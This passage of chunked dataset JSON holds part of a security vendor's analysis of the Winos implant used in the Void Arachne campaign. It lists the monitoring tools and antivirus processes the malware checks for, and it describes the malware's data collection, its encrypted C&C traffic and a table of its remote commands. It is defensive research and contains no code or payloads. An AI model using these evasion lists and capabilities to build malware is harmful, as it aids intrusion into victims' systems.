Before initiating the socket, it checks whether the antianalysis feature is configured to run. If this feature is configured, the malware verifies the presence of monitoring software by inspecting the window titles of running processes. If such software is detected, the malware enters sleep mode.  \nBelow is a list of monitoring software that the malware detects:  \n* 流量（Flow）\n* TaskExplorer\n* Wireshark\n* Fiddler\n* Process\n* ApateDNS\n* CurrPorts\n* 任务管理器（Task manager）\n* 火绒（Tinder）\n* 提示符（Prompt）\n* Malwarebytes\n* Port\n* 资源监视器（Resource monitor）\n* Capsa\n* TCPEye\n* Metascan\n* 网络分析（Network analysis）\n* Sniff  \nThe malware collects system information from an infected machine, including the IP address, computer name, antivirus software, operating system details, and hardware ID (HWID).  \nTable 6 shows a list of targeted antivirus (AV) software.",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Technical analysis",
        "Header 3": "### Winos main implant analysis",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Technical analysis",
          "### Winos main implant analysis"
        ],
        "content_type": "text",
        "token_length": 485,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "Header 4": "",
        "chunk_id": 31,
        "total_chunks": 37
      },
      "length": 485
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Technical analysis",
        "Header 3": "### Winos main implant analysis",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Technical analysis",
          "### Winos main implant analysis"
        ],
        "content_type": "table",
        "token_length": 434,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "Header 4": "",
        "chunk_id": 32,
        "total_chunks": 37
      },
      "length": 434
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nNext, the malware employs the encryption algorithm that we’ve previously discussed to encrypt all collected data. Using the *timeGetTime()* Windows API function, a new key will be generated to encrypt the collected data, which is different from the key used during the stager’s initial request. The malware appends the hardcoded value “06 00” to the encryption key to indicate that this request contains collected data. Unlike the stager, *LoginModule.dll* doesn’t send the key in a separate request, instead, it prefixes the value of the key to the collected data and sends this encrypted request to the C&C server.  \nFigure 40 shows the initial packet that the malware sends.  \nFigure 41.登录模块.dll (LoginModule.dll) decrypted initial traffic  \nThe malware then begins to listen for incoming commands from the C&C server. It can execute a variety of tasks, including loading additional plugins, capturing screenshots, and clearing system logs. These functions are managed and executed through controlled switch statements, ensuring precise and efficient handling of each instruction.  \nTable 7 lists the malware’s supported functionalities.",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Technical analysis",
        "Header 3": "### Winos main implant analysis",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Technical analysis",
          "### Winos main implant analysis"
        ],
        "content_type": "text",
        "token_length": 227,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "Header 4": "",
        "chunk_id": 33,
        "total_chunks": 37
      },
      "length": 227
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Technical analysis",
        "Header 3": "### Winos main implant analysis",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Technical analysis",
          "### Winos main implant analysis"
        ],
        "content_type": "table",
        "token_length": 235,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "Header 4": "",
        "chunk_id": 34,
        "total_chunks": 37
      },
      "length": 235
    }
  ],
  "selection_info": {
    "strategy": "quality",
    "original_count": 37,
    "filtered_count": 25,
    "selected_count": 25,
    "quality_threshold": 80,
    "avg_quality_score": 100.0,
    "min_quality_score": 100,
    "max_quality_score": 100
  },
  "total_chunks": 37,
  "selected_count": 25
}